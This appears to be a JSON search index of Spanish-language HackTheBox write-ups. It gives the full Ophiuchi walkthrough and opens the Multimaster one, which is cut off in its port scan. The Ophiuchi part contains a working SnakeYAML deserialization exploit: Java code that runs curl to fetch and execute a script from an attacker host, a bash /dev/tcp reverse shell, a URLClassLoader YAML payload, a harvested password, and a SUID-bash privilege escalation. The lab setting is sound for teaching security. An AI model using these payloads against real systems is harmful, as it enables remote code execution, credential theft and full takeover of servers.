C:\Users\Administrator\Documents&gt; cd C:\Users\Administrator\Desktop*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root. txt6d6c9abc4b5ecfaf4587047710b1bbb3"
    }, {
    "id": 9,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Ophiuchi",
    "title": "Maquina - Ophiuchu",
    "body": "2023/03/24 - Hoy vamos a hacer una máquina hackthebox de dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de deserialización de YAML para SnakeYAML utilizada en aplicaciones java, y modificando un archivo wasm para obtener privilegios de root. Vamos a comenzar creando un directorio con el nombre de la maquina: ❯ mkdir Ophiuchi❯ ls OphiuchiSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsEnumeración #: Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 227PING 10. 10. 10. 227 (10. 10. 10. 227) 56(84) bytes of data. 64 bytes from 10. 10. 10. 227: icmp_seq=1 ttl=63 time=124 ms--- 10. 10. 10. 227 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 124. 383/124. 383/124. 383/0. 000 msVemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre allPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 227 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-03-24 21:16 GMTInitiating SYN Stealth Scan at 21:16Scanning 10. 10. 10. 227 [65535 ports]Discovered open port 8080/tcp on 10. 10. 10. 227Discovered open port 22/tcp on 10. 10. 10. 227Completed SYN Stealth Scan at 21:17, 18. 29s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 227Host is up, received user-set (0. 15s latency). Scanned at 2023-03-24 21:16:59 GMT for 18sNot shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE  REASON22/tcp  open ssh    syn-ack ttl 638080/tcp open http-proxy syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 18. 46 seconds      Raw packets sent: 90294 (3. 973MB) | Rcvd: 90276 (3. 611MB)Podemos ver que los puertos que se encuentran abiertos son el puerto 22 ssh y el 8080 http. Escaneo de Version y Servicios. : ❯ nmap -sCV -p22,8080 10. 10. 10. 227 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-03-24 21:21 GMTNmap scan report for 10. 10. 10. 227Host is up (0. 27s latency). PORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)|  256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)|_ 256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)8080/tcp open http  Apache Tomcat 9. 0. 38|_http-title: Parse YAMLService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26. 57 secondsVisulizamos informacion interesante de los puertos escaneados:       Puerto   Servicio   Versión         22   SSH   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1       8080   HTTP   Apache Tomcat 9. 0. 38   Website - TCP 8080: Vamos a usar la herramienta whatweb para ver por consola el gestor de contenido de la pagina web. ❯ whatweb http://10. 10. 10. 227:8080http://10. 10. 10. 227:8080 [200 OK] Cookies[JSESSIONID], Country[RESERVED][ZZ], HttpOnly[JSESSIONID], IP[10. 10. 10. 227], Java, Title[Parse YAML]El comando nos reporta algo interesante Parse YAML Vamos a abrir la web y vemos que la pagina efectivamente es un Yaml Parser Vamos a realizar una busqueda para ver si hay un exploit o vulnerabilidad relacionado a Yaml Parser Encontramos un exploit publico en un repositorio de github:  https://github. com/artsploit/yaml-payload. El exploit nos habla sobre deserializacion, pero que es deserializacion?  Serializacion: Se refiere a un proceso por el cual se pasan un conjunto de bytes a un objeto entendible. En este repositorio nos habla de que mediante una deserealizacion insegura podemos conseguir RCE “ejecucion remota de comandos”: Basicamente se explota cuando una pagina tiene la funcion de parsear un archivo YAML.  ¿Pero como lo validamos entonces? Pues en el repositorio nos muestra un codigo en yaml que podemos parsear en la web donde al ejecutarse podemos aprovecharlo para ejecutar una peticion a nuestra maquina. Para lo cual primero debemos montarnos un servidor web, usaremos python: Despues realizamos el parseo: y vemos como efectivamente recibimos una peticion.  Explotación #: Al buscar el CVE encotramos un articulo sobre la vulnerabilidad:  CVE-2017-1000207 / Vuln in Swagger Parser and Swagger Codegen, YAML parsing results arbitrary code execution. Bueno entonces al pasarle nuestro payload SNAKE YAML llamara al constructor ScriptEngineFactory y este a su vez realizara una peticion a nuestra maquina. Vamos a descargar el repositorio que genera los payloads para poder ejecutar codigo en el sistema:  https://github. com/artsploit/yaml-payload. Hacemos la clonacion del repositorio: ❯ git clone https://github. com/artsploit/yaml-payloadClonando en 'yaml-payload'. . . remote: Enumerating objects: 10, done. remote: Total 10 (delta 0), reused 0 (delta 0), pack-reused 10Recibiendo objetos: 100% (10/10), listo. ❯ ls yaml-payload  2021-07-03-ophiuchi. mdEl exploit nos dice que debemos poner el codigo que deseamos ejecutar en AwesomeScriptEngineFactory. java ❯ tree. ├── 2021-07-03-ophiuchi. md└── yaml-payload  ├── README. md  └── src    ├── artsploit    │   └── AwesomeScriptEngineFactory. java    └── META-INF      └── services        └── javax. script. ScriptEngineFactory5 directories, 4 filesObservamos que se encuentra ahi el script AwesomeScriptEngineFactory. java lo abrimos y procedemos a modificar el codigo que queremos ejecutar package artsploit;import javax. script. ScriptEngine;import javax. script. ScriptEngineFactory;import java. io. IOException;import java. util. List;public class AwesomeScriptEngineFactory implements ScriptEngineFactory {  public AwesomeScriptEngineFactory() {    try {      Runtime. getRuntime(). exec( curl http://10. 10. 16. 4/reverse. sh -o /tmp/reverse. sh );      Runtime. getRuntime(). exec( bash /tmp/reverse. sh );    } catch (IOException e) {      e. printStackTrace();    }  }  @Override  public String getEngineName() {    return null;  }  @Override  public String getEngineVersion() {    return null;  }  @Override  public List&lt;String&gt; getExtensions() {    return null;  }  @Override  public List&lt;String&gt; getMimeTypes() {    return null;  }  @Override  public List&lt;String&gt; getNames() {    return null;  }  @Override  public String getLanguageName() {    return null;  }  @Override  public String getLanguageVersion() {    return null;  }  @Override  public Object getParameter(String key) {    return null;  }  @Override  public String getMethodCallSyntax(String obj, String m, String. . . args) {    return null;  }  @Override  public String getOutputStatement(String toDisplay) {    return null;  }  @Override  public String getProgram(String. . . statements) {    return null;  }  @Override  public ScriptEngine getScriptEngine() {    return null;  }}Como vemos en el script intentaremos al momento de realizar la desearializacion se ejecute una peticion que con curl nos realize una peticion a un archivo el cual alojaremos een nuestra maquina y lo depositaremos en el directorio tmp de la maquina victima con el nombre reverse. sh. Seguidamente procederemos a crear un script en bash con el nombre reverse. sh el cual al ejecutarse se encargara de ejecutarnos una peticion por el puerto 443 para obtener una shell reversa. #!/bin/bashbash -i &gt;&amp; /dev/tcp/10. 10. 16. 4/443 0&gt;&amp;1Procedemo a compilar AwesomeScriptEngineFactory. java y esto nos genera un archivo ❯ javac src/artsploit/AwesomeScriptEngineFactory. javajar -cvf yaml-payload. jar -C src/ . manifiesto agregadoignorando entrada META-INF/agregando: META-INF/services/(entrada = 0) (salida = 0)(almacenado 0%)agregando: META-INF/services/javax. script. ScriptEngineFactory(entrada = 36) (salida = 38)(desinflado -5%)agregando: artsploit/(entrada = 0) (salida = 0)(almacenado 0%)agregando: artsploit/AwesomeScriptEngineFactory. java(entrada = 1575) (salida = 420)(desinflado 73%)agregando: artsploit/AwesomeScriptEngineFactory. class(entrada = 1678) (salida = 705)(desinflado 57%)❯ ls src  README. md  yaml-payload. jarmodificamos el codigo YAML el cual insertaremos en la pagina YAML Parser, para que realize una peticion a nuestra maquina en donde tendremos alojado el archivo yaml-payload-jar y este a su vez nos ejecutara el codigo contenido que se encargara de realizar otra peticion a nuestro archivo reverse. sh !!javax. script. ScriptEngineManager [ !!java. net. URLClassLoader [[  !!java. net. URL [ http://10. 10. 16. 4/yaml-payload. jar ] ]]]Montamos un servidor con python en donde tenemos los dos archivos: ❯ ls src  README. md  reverse. sh  yaml-payload. jar❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . y nos ponemos en escucha con ncat en el puerto 443 ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Enviamos la peticion: y estamos dentro como el usuario tomcat: Como siempre vamos a realizar el tratamiento de la tty para obtener una full interactiva. ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 227. Ncat: Connection from 10. 10. 10. 227:56610. bash: cannot set terminal process group (796): Inappropriate ioctl for devicebash: no job control in this shelltomcat@ophiuchi:/$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/nulltomcat@ophiuchi:/$ ^Zzsh: suspended ncat -nlvp 443❯ stty raw -echo; fg[1] + continued ncat -nlvp 443                reset xtermtomcat@ophiuchi:/$ export TERM=xtermtomcat@ophiuchi:/$ export SHELL=bashtomcat@ophiuchi:/$ stty rows 48 columns 184 #dependera del tamaño de tu pantalla  ejecuta stty size Nos dirigimos al directorio home y tratamos de leer la primera flag user. txt pero vemos que no tenemos acceso: tomcat@ophiuchi:/$ cd /hometomcat@ophiuchi:/home$ lsadmintomcat@ophiuchi:/home$ cd admin/tomcat@ophiuchi:/home/admin$ lsuser. txttomcat@ophiuchi:/home/admin$ cat user. txt cat: user. txt: Permission deniedtomcat@ophiuchi:/home/admin$Como vemos que somos tomcat, si recordamos su estructura sabemos que existe un archivo llamado tomcat-users. xml tomcat@ophiuchi:/home/admin$ iduid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)tomcat@ophiuchi:/home/admin$ find / -name tomcat-users. xml 2&gt;/dev/null/opt/tomcat/conf/tomcat-users. xmltomcat@ophiuchi:/home/admin$Perfecto lo encontramos, ahora procedemos a leerlo y si efectivamente encontramos una credencial que corresponde al usuario admin &lt;tomcat-users xmlns= http://tomcat. apache. org/xml        xmlns:xsi= http://www. w3. org/2001/XMLSchema-instance        xsi:schemaLocation= http://tomcat. apache. org/xml tomcat-users. xsd 	version= 1. 0 &gt;&lt;user username= admin  password= whythereisalimit  roles= manager-gui,admin-gui /&gt;Procedemos esa contraseña con el usuario admin y bingo!, somos el usuario ‘admin’ y ahora si podemos visualizar la primera flag user. txt. tomcat@ophiuchi:/home/admin$ su adminPassword: admin@ophiuchi:~$ whoamiadminadmin@ophiuchi:~$ cat user. txt 330298484fe5a40840ac52e730fb7f15Ahora anteriormente vimos en la fase de reconocimiento que el puerto 22 estaba abierto, asi que por que no probemos a conectarnos por ssh: sshpass -p 'whythereisalimit' ssh admin@10. 10. 10. 227❯ ssh admin@10. 10. 10. 227The authenticity of host '10. 10. 10. 227 (10. 10. 10. 227)' can't be established. ECDSA key fingerprint is SHA256:OmZ+JsRqDVNaBWMshp7wogZM0KhSKkp1YmaILhRxSY0. Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10. 10. 10. 227' (ECDSA) to the list of known hosts. admin@10. 10. 10. 227's password: Welcome to Ubuntu 20. 04 LTS (GNU/Linux 5. 4. 0-51-generic x86_64)Ejecutamos el comando id para ver a que grupos pertenecemos y despues ejecutamos el comado sudo -l, para ver si podemos ejecutar un comando como usuario privilegiado ya que somos el usuario admin. Escalada de Privilegios #: admin@ophiuchi:~$ iduid=1000(admin) gid=1000(admin) groups=1000(admin)admin@ophiuchi:~$ sudo -lMatching Defaults entries for admin on ophiuchi:  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser admin may run the following commands on ophiuchi:  (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index. goadmin@ophiuchi:~$ Podemos ejecutar un programa llamado index. go usando el binario /usr/bin/go como root vale? Veremos como podemos aprovecharnos de esto para escalar privilegios. Nos dirigimos a la ruta donde se encuentra el archivo index. go. admin@ophiuchi:~$ cd /opt/wasm-functions/admin@ophiuchi:/opt/wasm-functions$ lsbackup deploy. sh index index. go main. wasmadmin@ophiuchi:/opt/wasm-functions$ ls -latotal 3928drwxr-xr-x 3 root root  4096 Oct 14 2020 . drwxr-xr-x 5 root root  4096 Oct 14 2020 . . drwxr-xr-x 2 root root  4096 Oct 14 2020 backup-rw-r--r-- 1 root root   88 Oct 14 2020 deploy. sh-rwxr-xr-x 1 root root 2516736 Oct 14 2020 index-rw-rw-r-- 1 root root   522 Oct 14 2020 index. go-rwxrwxr-x 1 root root 1479371 Oct 14 2020 main. wasmadmin@ophiuchi:/opt/wasm-functions$Veamos el codigo del archivo ìndex. go el cual podemos ejecutar: package mainimport (	 fmt 	wasm  github. com/wasmerio/wasmer-go/wasmer 	 os/exec 	 log )func main() {	bytes, _ := wasm. ReadBytes( main. wasm )	instance, _ := wasm. NewInstance(bytes)	defer instance. Close()	init := instance. Exports[ info ]	result,_ := init()	f := result. String()	if (f !=  1 ) {		fmt. Println( Not ready to deploy )	} else {		fmt. Println( Ready to deploy )		out, err := exec. Command( /bin/sh ,  deploy. sh ). Output()		if err != nil {			log. Fatal(err)		}		fmt. Println(string(out))	}}Al ejecutar el index. go vemos el mensaje Not ready to deploy el cual seria un problema por que al depender del directorio actual en el que este para ejecutarse, puedo secuestrar el archivo ‘main. wasm’ admin@ophiuchi:/opt/wasm-functions$ sudo /usr/bin/go run /opt/wasm-functions/index. goNot ready to deployadmin@ophiuchi:/opt/wasm-functions$Volvemos a leer el script y vemos que hay una variable f que es diferente de 1, y vemos que de ser lo contrario se daria la otra condicion que nos ejecutaria el deploy. sh, el cual podriamos tratar de manipular. package mainimport (	 fmt 	wasm  github. com/wasmerio/wasmer-go/wasmer 	 os/exec 	 log )func main() {	bytes, _ := wasm. ReadBytes( main. wasm )	instance, _ := wasm. NewInstance(bytes)	defer instance. Close()	init := instance. Exports[ info ]	result,_ := init()	f := result. String()	if (f !=  1 ) {		fmt. Println( Not ready to deploy )	} else {		fmt. Println( Ready to deploy )		out, err := exec. Command( /bin/sh ,  deploy. sh ). Output()		if err != nil {			log. Fatal(err)		}		fmt. Println(string(out))	}}Podemos ver si tenemos permiso de modificar el archivo deploy. sh admin@ophiuchi:/opt/wasm-functions$ cat deploy. sh #!/bin/bash# ToDo# Create script to automatic deploy our new web at tomcat port 8080admin@ophiuchi:/opt/wasm-functions$ ls -l deploy. sh -rw-r--r-- 1 root root 88 Oct 14 2020 deploy. shadmin@ophiuchi:/opt/wasm-functions$Despues de ver los permisos que tenemos sobre el archivo, sabemos que no podemos modificarlo pero vimos anteriormente que el script ìndex. go nos ejecuta el deploy. sh de forma relativa, interesante; entonces yo podria crearme en el directorio tmp mi propio archivo deploy. sh y copiarme el main. wasm ya que me los va a pillar desde alli y se podria tensa la cosa. admin@ophiuchi:/opt/wasm-functions$ cd /tmpadmin@ophiuchi:/tmp$ cp /opt/tomcat/     wasm-functions/ wasmer-go/   admin@ophiuchi:/tmp$ cp /opt/wasm-functions/main. wasm . admin@ophiuchi:/tmp$ touch deploy. shadmin@ophiuchi:/tmp$En deploy. sh lo que voy a intentar hacer es que este script me asigne una suid a la bash, para que como cualquier usuario en el sistema pueda spamear una consola como el propietario de forma temporal. #!/bin/bashchmod 4755 /bin/bashy si intentamos ejecutar nuevamente el index. go vemos que nuevamente nos sale. admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index. goNot ready to deployEntonces quiero pensar que en el archivo main. wasm del index. go debe existir una condicional que hace que la variable f no sea igual a 1 y por ese motivo no entra a la condicion que me ejecute el deploy. sh, pero si tratamos de leer el main. wasm no podriamos por que no es de un formato legible. La idea seria convertir el archivo main. wasm a un formato textual y hacer poder intentar alterar los valores, para ello podemos usar una herramienta disponible en github:  https://github. com/WebAssembly/wabtComo la maquina tiene python3 vamos a abrir un servidor web por el puerto 8000 para traernos el archivo main. wasm admin@ophiuchi:/tmp$ which python3/usr/bin/python3admin@ophiuchi:/tmp$ python3 -m http. server 8000Serving HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . 10. 10. 16. 4 - - [25/Mar/2023 01:21:42]  GET /main. wasm HTTP/1. 1  200 -wget http://10. 10. 10. 227:8000/main. wasm--2023-03-25 01:21:43-- http://10. 10. 10. 227:8000/main. wasmConectando con 10. 10. 10. 227:8000. . . conectado. Petición HTTP enviada, esperando respuesta. . . 200 OKLongitud: 1479371 (1,4M) [application/wasm]Grabando a: «main. wasm»main. wasm       100%[=========================&gt;]  1,41M  276KB/s  en 7,4s  2023-03-25 01:21:51 (195 KB/s) - «main. wasm» guardado [1479371/1479371]❯ ls yaml-payload  2021-07-03-ophiuchi. md  main. wasmAhora usando la herramienta previamente instalada haremos uso de wasm2wat sobre el archivo main. wasm y lo exportaremos como main. wat ❯ ls yaml-payload  2021-07-03-ophiuchi. md  main. wasm❯ cat main. wat(module (type (;0;) (func (result i32))) (func $info (type 0) (result i32)  i32. const 0) (table (;0;) 1 1 funcref) (memory (;0;) 16) (global (;0;) (mut i32) (i32. const 1048576)) (global (;1;) i32 (i32. const 1048576)) (global (;2;) i32 (i32. const 1048576)) (export  memory  (memory 0)) (export  info  (func $info)) (export  __data_end  (global 1)) (export  __heap_base  (global 2)))Al leer el archivo vemos que hay una constante declarada con el valor de 0 i32. const 0) la cual genera el problema por el cual el index. go no nos puede ejecutar el deploy. sh, asi que la modificaremos esa variable y le pondremos el valor de 1. (module (type (;0;) (func (result i32))) (func $info (type 0) (result i32)  i32. const 1) (table (;0;) 1 1 funcref) (memory (;0;) 16) (global (;0;) (mut i32) (i32. const 1048576)) (global (;1;) i32 (i32. const 1048576)) (global (;2;) i32 (i32. const 1048576)) (export  memory  (memory 0)) (export  info  (func $info)) (export  __data_end  (global 1)) (export  __heap_base  (global 2)))Una vez modificada debemos volver a generar un archivo main. wasm, el cual lo haremos con wat2wasm y lo subimos a la maquina victima compartiendonos un servicio con pythonno sin antes borrar el main. wasm de antes. ❯ /opt/wabt/build/wat2wasm main. wat &gt; main. wasm❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . admin@ophiuchi:/tmp$ rm main. wasm admin@ophiuchi:/tmp$ wget http://10. 10. 16. 4/main. wasm--2023-03-25 01:34:51-- http://10. 10. 16. 4/main. wasmConnecting to 10. 10. 16. 4:80. . . connected. HTTP request sent, awaiting response. . . 200 OKLength: 112 [application/wasm]Saving to: ‘main. wasm’main. wasm       100%[=========================&gt;]   112 --. -KB/s  in 0s2023-03-25 01:34:52 (23. 2 MB/s) - ‘main. wasm’ saved [112/112]admin@ophiuchi:/tmp$ lsdeploy. shhsperfdata_tomcatmain. wasmTeniendo los archivos volvemos a ejecutar el index. go con el privilegio asignado y admin@ophiuchi:/tmp$ sudo -lMatching Defaults entries for admin on ophiuchi:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser admin may run the following commands on ophiuchi:  (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index. goadmin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index. goReady to deployNos lo ejecuta correctamente, entonces nos ejecuto el deploy. sh veamos si es cierto: admin@ophiuchi:/tmp$ ls -ls /bin/bash1156 -rwsr-xr-x 1 root root 1183448 Feb 25 2020 /bin/bashy poom! ahora la bash es suid solo debemos ejecutar ahora el comando bash -p y visualizar la segunda flag root. txt y habriamos comprometido completamente el sistema :). admin@ophiuchi:/tmp$ bash -pbash-5. 0# whoamirootbash-5. 0# cd /rootbash-5. 0# cat root. txt 0a7279e90650d908863ec8e8155efb52bash-5. 0#"
    }, {
    "id": 10,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Multimaster",
    "title": "Maquina - Multimaster",
    "body": "2023/03/24 - Hola de nuevo el de hoy vamos a estar resolviendo la maquina Multimaster de hackthebox que es una maquina Windows de dificultad Insane, la cosa se va a tensar :smirk:. Comenzaremos realizando la enumeracion por smb, despues usaremos wfuzz para enumerar caracteres por fuerza bruta para validar una inyeccion, posteriormente crearemos un script en python donde realizaremos una sql injection avanzada para hacer bypass un waf incorporado en la maquina, obtendremos los RID Y SID de los usuarios del dominio y con ellos encontraremos unas credenciales validas que nos permitiran conectarnos al sistema, donde aprovecharemos una vulnerabilidad asociada a una version de Visual Studio Code que por medio de la exposicion debugger lograremos obtener RCE, finalmente usaremos BoodHound donde setearemos kerberos dont require preauthetication a un usuario miembro del grupo Server Operators y manipulando el binPath nos convertiremos en el usuario Administrator. Vamos a comenzar como siempre creando un directorio con el nombre de la maquina: ❯ mkdir Multimaster❯ ls Multimaster❯ which mktmkt () {	mkdir {nmap,content,scripts}}❯ mkt❯ ls content  nmap  scriptsEnumeración #: Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 179PING 10. 10. 10. 179 (10. 10. 10. 179) 56(84) bytes of data. 64 bytes from 10. 10. 10. 179: icmp_seq=1 ttl=127 time=117 ms--- 10. 10. 10. 179 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 116. 535/116. 535/116. 535/0. 000 msVemos que recibimos respuesta y que el ttl es igual a 127 correspondiente a una maquina windowns, seguidamente procederemos a el scaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 179 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-03-31 15:32 GMTInitiating SYN Stealth Scan at 15:32Scanning 10. 10. 10. 179 [65535 ports]Discovered open port 135/tcp on 10. 10. 10. 179Discovered open port 53/tcp on 10. 10. 10. 179Discovered open port 445/tcp on 10. 10. 10. 179Discovered open port 3389/tcp on 10. 10. 10. 179Discovered open port 80/tcp on 10. 10. 10. 179Discovered open port 139/tcp on 10. 10. 10. 179Discovered open port 3269/tcp on 10. 10. 10. 179Discovered open port 389/tcp on 10. 10. 10. 179Discovered open port 9389/tcp on 10. 10. 10. 179Discovered open port 49698/tcp on 10. 10. 10. 179Discovered open port 49667/tcp on 10. 10. 10. 179Discovered open port 3268/tcp on 10. 10. 10. 179Discovered open port 49675/tcp on 10. 10. 10. 179Discovered open port 49674/tcp on 10. 10. 10. 179Discovered open port 49681/tcp on 10. 10. 10. 179Discovered open port 88/tcp on 10. 10. 10. 179Discovered open port 5985/tcp on 10. 10. 10. 179Discovered open port 593/tcp on 10. 10. 10. 179Discovered open port 49666/tcp on 10. 10. 10. 179Discovered open port 636/tcp on 10. 10. 10. 179Discovered open port 464/tcp on 10. 10. 10. 179Completed SYN Stealth Scan at 15:32, 41. 87s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 179Host is up, received user-set (0. 24s latency). Scanned at 2023-03-31 15:32:09 GMT for 41sNot shown: 65514 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE     REASON53/tcp  open domain      syn-ack ttl 12780/tcp  open http       syn-ack ttl 12788/tcp  open kerberos-sec   syn-ack ttl 127135/tcp  open msrpc      syn-ack ttl 127139/tcp  open netbios-ssn   syn-ack ttl 127389/tcp  open ldap       syn-ack ttl 127445/tcp  open microsoft-ds   syn-ack ttl 127464/tcp  open kpasswd5     syn-ack ttl 127593/tcp  open http-rpc-epmap  syn-ack ttl 127636/tcp  open ldapssl     syn-ack ttl 1273268/tcp open globalcatLDAP  syn-ack ttl 1273269/tcp open globalcatLDAPssl syn-ack ttl 1273389/tcp open ms-wbt-server  syn-ack ttl 1275985/tcp open wsman      syn-ack ttl 1279389/tcp open adws       syn-ack ttl 12749666/tcp open unknown     syn-ack ttl 12749667/tcp open unknown     syn-ack ttl 12749674/tcp open unknown     syn-ack ttl 12749675/tcp open unknown     syn-ack ttl 12749681/tcp open unknown     syn-ack ttl 12749698/tcp open unknown     syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 41. 95 seconds      Raw packets sent: 196589 (8. 650MB) | Rcvd: 47 (2. 068KB)Podemos ver puertos interesantes que se encuentran abiertos como 135 rpc , 139 ldap , 445 smb , 80 http, 88 Kerberos y 5985 winrm, podemos asumir que nos enfrentaremos a un entorno de directorio activo. Escaneo de Version y Servicios. : ❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49667,49674,49675,49681,49698 10. 10. 10. 179 -oN targetsStarting Nmap 7. 92 ( https://nmap. org ) at 2023-03-31 15:35 GMTNmap scan report for 10. 10. 10. 179Host is up (0. 24s latency). PORT   STATE SERVICE    VERSION53/tcp  open domain    Simple DNS Plus80/tcp  open http     Microsoft IIS httpd 10. 0|_http-server-header: Microsoft-IIS/10. 0|_http-title: MegaCorp| http-methods: |_ Potentially risky methods: TRACE88/tcp  open kerberos-sec Microsoft Windows Kerberos (server time: 2023-03-31 15:42:39Z)135/tcp  open msrpc     Microsoft Windows RPC139/tcp  open netbios-ssn  Microsoft Windows netbios-ssn389/tcp  open ldap     Microsoft Windows Active Directory LDAP (Domain: MEGACORP. LOCAL, Site: Default-First-Site-Name)445/tcp  open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)464/tcp  open kpasswd5?593/tcp  open ncacn_http  Microsoft Windows RPC over HTTP 1. 0636/tcp  open tcpwrapped3268/tcp open ldap     Microsoft Windows Active Directory LDAP (Domain: MEGACORP. LOCAL, Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal Services| ssl-cert: Subject: commonName=MULTIMASTER. MEGACORP. LOCAL| Not valid before: 2023-03-30T15:34:28|_Not valid after: 2023-09-29T15:34:28| rdp-ntlm-info: |  Target_Name: MEGACORP|  NetBIOS_Domain_Name: MEGACORP|  NetBIOS_Computer_Name: MULTIMASTER|  DNS_Domain_Name: MEGACORP. LOCAL|  DNS_Computer_Name: MULTIMASTER. MEGACORP. LOCAL|  DNS_Tree_Name: MEGACORP. LOCAL|  Product_Version: 10. 0. 14393|_ System_Time: 2023-03-31T15:43:32+00:00|_ssl-date: 2023-03-31T15:44:11+00:00; +6m58s from scanner time. 5985/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found9389/tcp open mc-nmf    . NET Message Framing49666/tcp open msrpc     Microsoft Windows RPC49667/tcp open msrpc     Microsoft Windows RPC49674/tcp open ncacn_http  Microsoft Windows RPC over HTTP 1. 049675/tcp open msrpc     Microsoft Windows RPC49681/tcp open msrpc     Microsoft Windows RPC49698/tcp open msrpc     Microsoft Windows RPCService Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: |  3. 1. 1: |_  Message signing enabled and required| smb-security-mode: |  account_used: &lt;blank&gt;|  authentication_level: user|  challenge_response: supported|_ message_signing: required| smb-os-discovery: |  OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6. 3)|  Computer name: MULTIMASTER|  NetBIOS computer name: MULTIMASTER\x00|  Domain name: MEGACORP. LOCAL|  Forest name: MEGACORP. LOCAL|  FQDN: MULTIMASTER. MEGACORP. LOCAL|_ System time: 2023-03-31T08:43:32-07:00| smb2-time: |  date: 2023-03-31T15:43:36|_ start_date: 2023-03-31T15:34:34|_clock-skew: mean: 1h30m58s, deviation: 3h07m50s, median: 6m58sService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 106. 97 secondsVisulizamos informacion interesante de los puertos escaneados:       Puerto   Servicio   Versión         53   DNS   Simple DNS Plus       80   HTTP   Microsoft IIS httpd 10. 0       88   KERBEROS   Microsoft Windows Kerberos       135   RPC   Microsoft Windows RPC       139   LDAP   Microsoft Windows netbios-ssn       445   SMB   ?       3389   RDP   Microsoft Terminal Services       5985   WINRM   Microsoft 